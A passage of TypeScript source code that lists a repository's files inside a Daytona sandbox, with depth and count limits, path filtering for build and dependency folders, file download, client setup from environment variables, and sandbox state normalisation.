        if (depth > MAX_TREE_DEPTH)
          return { items: [] as readonly { name: string; isDir: boolean; size: number }[], depth, relativePath };
        const currentPath = relativePath ? `${repoPath}/${relativePath}` : repoPath;
        const items = await sandbox.fs.listFiles(currentPath);
        const sorted = [...items].sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0));
        return { items: sorted, depth, relativePath };
      }),
    );

    // SINGLE-WRITER merge phase. All Daytona I/O has settled and we are in
    // a synchronous loop, so the `acc.length` cap holds without races.
    const nextFrontier: typeof frontier = [];
    for (const { items, depth, relativePath } of listings) {
      for (const item of items) {
        if (acc.length >= MAX_LISTED_FILES) break;
        const nextRelative = relativePath ? `${relativePath}/${item.name}` : item.name;
        if (ignorePath(nextRelative)) continue;
        acc.push({
          path: nextRelative,
          parentPath: relativePath,
          fileType: item.isDir ? "dir" : "file",
          extension: undefined,
          language: undefined,
          sizeBytes: item.size,
          isEntryPoint: false,
          isConfig: false,
          isImportant: false,
          summary: undefined,
        });
        if (item.isDir && depth < MAX_TREE_DEPTH) {
          nextFrontier.push({ relativePath: nextRelative, depth: depth + 1 });
        }
      }
    }
    frontier.push(...nextFrontier);
  }

  return acc;
}

async function downloadUtf8File(sandbox: Sandbox, path: string) {
  const buffer = await sandbox.fs.downloadFile(path, 30);
  return buffer.toString("utf8").slice(0, 20_000);
}

async function getSandbox(remoteId: string) {
  const daytona = createDaytonaClient();
  return daytona.get(remoteId);
}

function isDaytonaNotFoundError(error: unknown): boolean {
  if (error instanceof DaytonaNotFoundError) {
    return true;
  }

  if (error instanceof DaytonaError && error.statusCode === 404) {
    return true;
  }

  if (typeof error !== "object" || error === null) {
    return false;
  }

  const candidate = error as {
    statusCode?: unknown;
    response?: {
      status?: unknown;
    };
  };

  return candidate.statusCode === 404 || candidate.response?.status === 404;
}

function createDaytonaClient() {
  const apiKey = process.env.DAYTONA_API_KEY;
  if (!apiKey) {
    throw new Error("DAYTONA_API_KEY is required to provision a sandbox.");
  }

  return new Daytona({
    apiKey,
    apiUrl: process.env.DAYTONA_API_URL,
    target: process.env.DAYTONA_TARGET,
  });
}

function ignorePath(path: string) {
  return (
    path.startsWith(".git/") ||
    path.startsWith("node_modules/") ||
    path.startsWith("dist/") ||
    path.startsWith("build/") ||
    path.startsWith(".next/") ||
    path.startsWith(".turbo/")
  );
}

function readNumberEnv(name: string, fallback: number) {
  const value = process.env[name];
  if (!value) {
    return fallback;
  }
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : fallback;
}

function normalizeRemoteSandboxState(state: string | undefined): RemoteSandboxState {
  if (!state) {
    return "unknown";
  }

  const normalized = state.toLowerCase();
  if (normalized === "started") {
    return "started";
  }
  if (normalized === "stopped") {
    return "stopped";
  }
  if (normalized === "archived") {
    return "archived";
  }
  if (normalized === "destroyed" || normalized === "deleted") {
    return "destroyed";
  }
  if (normalized === "error" || normalized === "failed") {
    return "error";
  }
  return "unknown";
}
